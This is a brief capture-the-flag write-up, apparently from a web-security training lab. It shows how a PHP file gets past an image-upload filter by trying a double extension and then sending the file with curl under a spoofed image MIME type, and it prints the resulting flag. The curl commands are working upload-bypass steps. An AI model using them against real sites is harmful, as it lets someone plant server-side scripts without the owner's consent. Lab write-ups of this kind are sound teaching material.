 # Upload bypass
 
 In ?page=upload page we are asket to upload an image so lets try to upload a malicious file first i tried a file .php and got this response
 
 > Your image was not uploaded.

then I tried next .php.jpg the response was

> /tmp/file.php.jpg succesfully uploaded.

But no flag so there is another way to do it lets try with curl 

> -X to specify the method type in our case its POST

> -F specify data to send (files) example email=blabla@blabla.bla the email is the name of the input

In ouar case there is 2 input the first one is uploaded that contain the data then Upload to submit

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php" -F Upload=Upload http://ipaddress/?page=upload

We got the same response now lets try to change the mime type of the file

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php;type=image/jpg" -F Upload=Upload http://10.12.177.243/?page=upload

Worked !

> <h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2>
